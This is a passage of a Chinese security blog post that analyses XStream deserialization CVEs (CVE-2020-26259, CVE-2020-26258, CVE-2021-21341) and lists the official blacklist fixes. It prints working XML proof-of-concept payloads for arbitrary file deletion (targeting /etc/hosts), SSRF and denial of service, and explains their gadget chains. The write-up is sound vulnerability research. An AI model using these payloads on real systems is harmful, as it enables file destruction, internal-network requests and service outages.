&lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>层层赋值~，Map内部使用entry作为数据结构，entry里就存着key和value，每一个entry代表一个键值对，POC中的键为jdk.nashorn.internal.objects.NativeString类实例，值为test字符串。还要提一嘴这个outer-class标签，当存在非静态内部类时，他会持有一个外部类的实例，outer-class标签就是代表持有的这个外部类的实例。举个例子：对于ArrayList$Itr来说，他有一个非静态内部类Itr：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081730633.png" alt="image-20230408173052550"></p>
<p>而这个非静态内部类Itr，为了能使用外部类（也就是ArrayList）的属性和方法，他会持有一个外部类的实例，也就是this$0（非静态内部类的属性名，值为外部类的实例）。而在XStream中，outer-class标签代表的就是外部类的实例，也就是this$0。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081733591.png" alt="image-20230408173303519"></p>
<p>而在POC中，我们指定了outer-class标签，他代表外部类的实例（ArrayList），然后子标签为java.lang.ProcessBuilder，则表示往ArrayList存入java.lang.ProcessBuilder对象。</p>
<p>这个POC的序列化过程如下：</p>
<ol>
<li>创建HashMap，键为NativeString类的实例，值为test字符串；</li>
<li>为NativeString类的实例的value属性赋值，由于value属性需要一个CharSequence类的实例，而POC指定的类为Base64Data为CharSequence类的子类，会实例化Base64Data类，然后为他的dataHandler属性赋值；</li>
<li>他的dataHandler属性的类型DataHandler，然后就是实例化DataHandler类，然后为他的属性dataSource赋值；</li>
<li>dataSource我们指定了为XmlDataSource类型，然后他会实例化XmlDataSource类，为他的is属性赋值；</li>
<li>is属性我们指定了为SequenceInputStream类型，然后他会实例化SequenceInputStream类，为他的e属性赋值；</li>
<li>e属性我们指定了为MultiUIDefaultsEnumerator类型，然后他会实例化MultiUIDefaultsEnumerator类，为他的iterator和type属性赋值；</li>
<li>type属性赋值为KEYS，iterator属性我们指定了为FilterIterator类型，然后他会实例化FilterIterator类，为他的iter、filter和next属性赋值；</li>
<li>next属性赋值为空，iter属性我们指定了为Itr类型，然后他会实例化Itr类，为他的expectedModCount和outer-class属性赋值；filter属性我们指定了为ContainsFilter类型，然后他会实例化ContainsFilter类，为他的method和name属性赋值；</li>
<li>expectedModCount属性赋值为1，outer-class属性为ArrayList类型，获取他的实例，然后存入java.lang.ProcessBuilder对象。method属性为Method类，也是创建实例，为他的属性class、name、parameter-types赋值，将name属性赋值为start。</li>
</ol>
<p>在MapConverter的unmarshal方法中，创建完map后往里面填充元素：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081828236.png" alt="image-20230408182843173"></p>
<p>从populateMap-&gt;populateMap重载，在重载里接着调用putCurrentEntryIntoMap将entry填充到map：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081831035.png" alt="image-20230408183114984"></p>
<p>在putCurrentEntryIntoMap方法里，调用HashMap的put方法将NativeString类实例和test字符串放入map：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081832744.png" alt="image-20230408183227686"></p>
<p>HashMap#put-&gt;HashMap#hash，调用key的hashCode方法，也就是NativeString类实例的hashCode方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081834004.png" alt="image-20230408183420944"></p>
<p>NativeString类实例的hashCode方法里，调用getStringValue方法，然后调用value属性的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081835990.png" alt="image-20230408183532944"></p>
<p>之前说过value属性赋值为Base64Data类实例，这时候调用就是Base64Data的toString方法，在toString方法里，又调用了get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304081836040.png" alt="image-20230408183652991"></p>
<p>在get方法里，获取is属性，然后调用baos.readFrom(is);将SequenceInputStream传入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082024697.png" alt="image-20230408202417634"></p>
<p>使用传入的is（SequenceInputStream）进行读：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082026160.png" alt="image-20230408202614112"></p>
<p>在read方法里又调用了nextStream方法（我们未对in赋值，而是对e赋值为MultiUIDefaultsEnumerator类实例）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082027798.png" alt="image-20230408202707747"></p>
<p>nextStream方法里的第一步：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082034139.png" alt="image-20230408203441983"></p>
<p>nextStream方法的第二步：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082039896.png" alt="image-20230408203943833"></p>
<p>进入advance方法里查看，这里通过ArrayList$Itr获取ArrayList里的值，为之前存好的ProcessBuiler对象，然后调用filter的filter方法，filter为ContainsFilter类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082041329.png" alt="image-20230408204116268"></p>
<p>在filter方法里执行命令并传入创建好的ProcessBuiler对象（封装了要执行的命令）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082044139.png" alt="image-20230408204420082"></p>
<p>最后在javax.imageio.ImageIO$ContainsFilter的filter方法执行了命令。</p>
<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>1.4.13版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot; &#125;); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.7~1.4.12版本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot; &#125;); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.6版本及以下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xstream.registerConverter(new Converter() &#123;</span><br><span class="line">  public boolean canConvert(Class type) &#123;</span><br><span class="line">    return type != null &amp;&amp; (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || type == java.lang.Void.class || void.class || type.getName().equals(&quot;javax.imageio.ImageIO$ContainsFilter&quot;) || Proxy.isProxy(type));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_VERY_HIGH);</span><br></pre></td></tr></table></figure>

<p>最后发现一个有意思的东西，这个漏洞由国人挖的（太强了）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082054454.png" alt="image-20230408205415405"></p>
<h2 id="CVE-2020-26259"><a href="#CVE-2020-26259" class="headerlink" title="CVE-2020-26259"></a>CVE-2020-26259</h2><h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D;  1.4.14</li>
</ul>
<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>该漏洞会造成任意文件删除。</p>
<p>官网给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;contentType&gt;text/plain&lt;/contentType&gt;</span><br><span class="line">            &lt;is class=&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;&gt;</span><br><span class="line">              &lt;tempFile&gt;/etc/hosts&lt;/tempFile&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>简化后的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">            &lt;is class=&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;&gt;</span><br><span class="line">              &lt;tempFile&gt;D:/1.txt&lt;/tempFile&gt;</span><br><span class="line">            &lt;/is&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>和上个漏洞不同的地方在于XmlDataSource下的is属性的类实例由SequenceInputStream变为FileStream。</p>
<p>在Base64Data的get方法里，将获取的is对象（FileStream）传入readFrom方法里：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082105440.png" alt="image-20230408210503387"></p>
<p>在readFrom方法里干啥不重要，然后调用is.close();将流（FileStream）关闭：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082106475.png" alt="image-20230408210611412"></p>
<p>在close方法里，将文件删除：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082108712.png" alt="image-20230408210809658"></p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>该漏洞还挺简单的，以下是修复方案：</p>
<p>1.4.14版本的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;jdk.nashorn.internal.objects.NativeString&quot; &#125;); </span><br><span class="line">xstream.denyTypesByRegExp(new String[]&#123; &quot;.*\\.ReadAllStream\\$FileStream&quot; &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.13版本的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot; &#125;); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class &#125;); </span><br><span class="line">xstream.denyTypesByRegExp(new String[]&#123; &quot;.*\\.ReadAllStream\\$FileStream&quot; &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.7~1.4.12版本的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xstream.denyTypes(new String[]&#123; &quot;javax.imageio.ImageIO$ContainsFilter&quot;, &quot;jdk.nashorn.internal.objects.NativeString&quot; &#125;);</span><br><span class="line">xstream.denyTypes(new Class[]&#123; java.lang.ProcessBuilder.class, java.beans.EventHandler.class, java.lang.ProcessBuilder.class, java.lang.Void.class, void.class &#125;);</span><br><span class="line">xstream.denyTypesByRegExp(new String[]&#123; &quot;.*\\$LazyIterator&quot;, &quot;javax\\.crypto\\..*&quot;, &quot;.*\\.ReadAllStream\\$FileStream&quot; &#125;);</span><br></pre></td></tr></table></figure>

<p>1.4.6及以下的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xstream.registerConverter(new Converter() &#123;</span><br><span class="line">  public boolean canConvert(Class type) &#123;</span><br><span class="line">    return type != null &amp;&amp; (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class</span><br><span class="line">        || type.getName().equals(&quot;javax.imageio.ImageIO$ContainsFilter&quot;) || type.getName().equals(&quot;jdk.nashorn.internal.objects.NativeString&quot;)</span><br><span class="line">        || type == java.lang.Void.class || void.class || Proxy.isProxy(type)</span><br><span class="line">        || type.getName().startsWith(&quot;javax.crypto.&quot;) || type.getName().endsWith(&quot;$LazyIterator&quot;) || type.getName().endsWith(&quot;.ReadAllStream$FileStream&quot;));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) &#123;</span><br><span class="line">    throw new ConversionException(&quot;Unsupported type due to security reasons.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, XStream.PRIORITY_VERY_HIGH);</span><br></pre></td></tr></table></figure>

<p>官方给的修复方案都是直接加黑名单或者转换器，其实对于用户来说直接升级版本也行。</p>
<h2 id="CVE-2020-26258"><a href="#CVE-2020-26258" class="headerlink" title="CVE-2020-26258"></a>CVE-2020-26258</h2><h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.14</li>
</ul>
<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成SSRF。</p>
<p>POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">            &lt;url&gt;http://localhost:8080/internal/:&lt;/url&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">          &lt;transferFlavors/&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>删减后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&#x27;javax.activation.URLDataSource&#x27;&gt;</span><br><span class="line">            &lt;url&gt;http://localhost:2333/internal/:&lt;/url&gt;</span><br><span class="line">          &lt;/dataSource&gt;</span><br><span class="line">        &lt;/dataHandler&gt;</span><br><span class="line">      &lt;/value&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;string&gt;test&lt;/string&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>这次将dataSource属性的值由XmlDataSource类实例变成URLDataSource类实例。</p>
<p>在Base64Data的get方法中，调用了URLDataSource类实例的getInputStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082116232.png" alt="image-20230408211616169"></p>
<p>在getInputStream方法里直接向url地址发起连接：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082116108.png" alt="image-20230408211642043"></p>
<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>这里的修复方案与上一个漏洞（CVE-2020-26259）相同。</p>
<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>XStream &lt;&#x3D; 1.4.15 爆出了11个漏洞，从CVE-2021-21341到CVE-2021-21351。</p>
<h2 id="CVE-2021-21341"><a href="#CVE-2021-21341" class="headerlink" title="CVE-2021-21341"></a>CVE-2021-21341</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>发现很多同人文，也不知道是谁抄的谁，比如：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11372#toc-1">XSteam历史漏洞分析 </a>和<a target="_blank" rel="noopener" href="https://paper.seebug.org/1543/#2-cve-2021-21344">Xstream 反序列化远程代码执行漏洞深入分析</a>这两篇文章前面的内容一模一样，真是牛~</p>
<p>这个漏洞会造成无限循环耗光资源，也就是DOS攻击。</p>
<p>官网的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">            &lt;buf&gt;&lt;/buf&gt;</span><br><span class="line">            &lt;pos&gt;-2147483648&lt;/pos&gt;</span><br><span class="line">            &lt;mark&gt;0&lt;/mark&gt;</span><br><span class="line">            &lt;count&gt;0&lt;/count&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">          &lt;consumed&gt;false&lt;/consumed&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">        &lt;transferFlavors/&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">      &lt;dataLen&gt;0&lt;/dataLen&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>先来理解四个东西：</p>
<p>第一个是serialization&#x3D;’custom’：</p>
<blockquote>
<p>网上搜不到，问的GPT~</p>
</blockquote>
<p>在XStream库中，当标签带有<code>serialization=&#39;custom&#39;</code>属性时，它表示该标签的序列化将使用自定义序列化方式。这意味着，当XStream库在将Java对象序列化为XML时，它将调用自定义序列化方法（writeObject）来序列化该对象的内容，而不是使用默认的序列化方式。</p>
<p>序列化和反序列化使用SerializableConverter来进行转换Java对象和xml。</p>
<p>在SerializableConverter的doUnmarshal方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082229068.png" alt="image-20230408222921005"></p>
<p>会调用callReadObject方法，进入查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082231126.png" alt="image-20230408223119069"></p>
<p>发现他会<strong>调用PriorityQueue的readObject方法</strong>。</p>
<p>也就是说当标签带有serialization&#x3D;’custom’属性时，会调用该xml标签对应的Java对象的readObject方法。举个例子：对于刚刚的POC，在PriorityQueue标签中指定了serialization&#x3D;’custom’属性，同时它有一个PriorityQueue的子标签，表示调用PriorityQueue的readObject方法进行反序列化。</p>
<p>第二个是 default标签： default标签的值是一个XML片段，它描述了Java对象的属性值，它里面存的属性并不完整，这取决于序列化时（writeObject）为哪些属性设置了值，就会在default标签下。</p>
<p>第三个是 <code>&lt;unserializable-parents/&gt;</code>标签：它将指示XStream在反序列化时忽略该对象的所有父类，也就是不反序列化父类。</p>
<p>第四个是reference属性：在XStream库中，当标签中带有<code>reference</code>属性时，它表示当前对象引用了已经反序列化的另一个对象。<code>reference</code>属性的值是一个字符串，它指定了被引用对象的唯一标识符，通常是该对象在反序列化时生成的ID。当XStream库在反序列化时遇到一个带有<code>reference</code>属性的元素时，它会尝试在已经反序列化的对象中查找具有相同ID的对象，并将该元素的值设置为该对象的引用。使用<code>reference</code>属性可以减少XML文件的大小，并且在反序列化时可以避免创建多个相同对象的副本。在处理大型对象图形时，这种优化非常重要。</p>
<p>接着简化一下POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;javafx.collections.ObservableList$1&#x27;/&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">      &lt;dataHandler&gt;</span><br><span class="line">        &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;</span><br><span class="line">          &lt;is class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;</span><br><span class="line">            &lt;pos&gt;-2147483648&lt;/pos&gt;</span><br><span class="line">          &lt;/is&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">      &lt;/dataHandler&gt;</span><br><span class="line">    &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt;</span><br><span class="line">    &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference=&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;/&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>之前说过他会调用自定义的readObject完成反序列化，这有点像yso的某条链，然后调用heapify方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082341732.png" alt="image-20230408234121794"></p>
<p>在heapify方法里调用siftDown方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082342332.png" alt="image-20230408234207283"></p>
<p>comparator我们已经赋值为ObservableList$1类的实例了，所以他会调用siftDownUsingComparator方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082342632.png" alt="image-20230408234247585"></p>
<p>然后ObservableList是个接口，而ObservableList$1代表匿名类，在Java中，就算是匿名类，在运行中也会存储一个类名，按照在代码中的定义顺序，在外部类名后增加$1、$2等依次排序。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082343848.png" alt="image-20230408234349768"></p>
<p>然后来到sorted方法内部的比较器的compare方法，里面调用Base64Data的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304082346091.png" alt="image-20230408234643003"></p>
<p>在toString方法里又调用了get方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091556277.png" alt="image-20230409155601181"></p>
<p>获取XmlDataSource的is属性，我们已赋值为ByteArrayInputStream类实例，然后调用readFrom方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091556692.png" alt="image-20230409155638630"></p>
<p>在readFrom方法里死循环：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091558957.png" alt="image-20230409155836905"></p>
<p>进入read方法查看，他其实是ByteArrayInputStream的read方法，这里需要提一嘴，this.buf为空，count未赋值，默认未0，所以buf.length也为0，调用read方法传进去的三个参数的值分别为空、0、0：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091602569.png" alt="image-20230409160221883"></p>
